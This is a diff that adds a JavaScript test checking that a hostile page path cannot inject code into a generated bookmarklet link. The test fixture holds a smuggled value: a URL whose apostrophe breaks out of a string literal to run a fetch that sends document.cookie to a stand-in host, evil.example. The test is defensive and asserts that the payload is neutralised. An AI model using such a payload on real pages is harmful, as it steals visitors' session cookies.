@@ -158,3 +158,17 @@ test('opening the page from disk warns that the loader has nothing to fetch', ()
   assert.equal(local.getElementById('local').hidden, false);
   assert.match(local.getElementById('local').textContent, /self-contained/i);
 });
+
+test('a hostile page path cannot inject code into the bookmarklet', () => {
+  const { page } = build();
+  // Serving the page from an attacker-chosen path is possible on any host with
+  // catch-all routing. An apostrophe survives URL encoding, so if it reached
+  // the generated string literal it would close it and append arbitrary code.
+  const hostile = "https://host.example/x'+fetch('https://evil.example/'+document.cookie)+'/";
+  const href = open(page, { url: hostile, userAgent: CHROME_UA })
+    .querySelector('[data-bookmarklet]').href;
+
+  assert.ok(!href.includes("evil.example/'+"), `injection survived: ${href}`);
+  assert.ok(!/'\s*\+/.test(href.replace(/^javascript:/, '')), `broke out of the literal: ${href}`);
+  assert.ok(href.includes('%27'), `the apostrophe was not encoded: ${href}`);
+});
